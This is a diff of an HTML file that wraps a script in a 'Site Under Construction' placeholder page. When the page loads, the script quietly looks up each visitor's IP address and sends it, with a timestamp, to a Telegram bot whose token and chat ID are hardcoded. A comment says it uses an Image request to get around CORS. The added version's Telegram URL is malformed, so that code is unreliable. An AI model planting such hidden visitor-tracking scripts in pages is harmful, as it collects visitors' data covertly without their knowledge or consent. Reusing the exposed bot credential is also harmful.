@@ -1,20 +1,37 @@
-<script>
-    window.onload = function() {
-        // 1. Get the IP address
-        fetch('https://ipify.org')
-            .then(response => response.json())
-            .then(data => {
-                const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
-                const chatId = '8714686528';
-                const textMessage = encodeURIComponent(`📌 New Visitor Logged\n🌐 IP: ${data.ip}`);
-                
-                // 2. Use a simplified GET request URL
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
-                
-                // 3. Send using standard image pre-fetching to completely bypass CORS security
-                const img = new Image();
-                img.src = url;
-            })
-            .catch(error => console.error('Error:', error));
-    };
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <script>
+        window.onload = function() {
+            // 1. Fetch the user's IP address from a public service
+            fetch('https://ipify.org')
+                .then(response => response.json())
+                .then(data => {
+                    const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
+                    const chatId = '8714686528';
+                    
+                    // 2. Format the message text and encode it safely for the URL
+                    const messageText = `📌 New Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
+                    const encodedText = encodeURIComponent(messageText);
+                    
+                    // 3. Construct the exact API request URL
+                    const telegramUrl = `https://telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodedText}`;
+                    
+                    // 4. Send the request via a background Image object to bypass CORS blocks
+                    const requestTrigger = new Image();
+                    requestTrigger.src = telegramUrl;
+                })
+                .catch(error => {
+                    console.error('IP fetch failed:', error);
+                });
+        };
+    </script>
+</head>
+<body>
+    <h1>Site Under Construction</h1>
+    <p>Please check back later.</p>
+</body>
+</html>
